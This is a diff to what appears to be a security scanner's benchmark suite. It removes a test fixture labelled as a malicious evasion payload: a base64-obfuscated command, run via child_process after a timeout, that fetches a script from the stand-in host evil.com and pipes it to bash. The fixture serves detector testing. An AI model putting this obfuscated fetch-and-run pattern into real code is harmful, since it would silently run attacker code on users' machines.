@@ -9,19 +9,6 @@ const BENCHMARK_FILES = [
         path: path.join(__dirname, '../packages/sentinel-core/lib/gh_bridge.js'),
         expectClean: true,
     },
-    {
-        name: 'adversarial_base64_wrapper.js',
-        desc: 'Malicious Evasion Payload (Must yield Critical Score)',
-        content: `
-            const cp = require('child_process');
-            const payload = Buffer.from('Y3VybCAtcyBodHRwczovL2V2aWwuY29tL3NoLmV4ZSB8IGJhc2g=', 'base64').toString('ascii');
-            setTimeout(() => {
-                cp.exec(payload, (err, out) => console.log(out));
-            }, 1000);
-        `,
-        expectCritical: true,
-        minScore: 1,
-    }
 ];
 
 async function runSuite() {
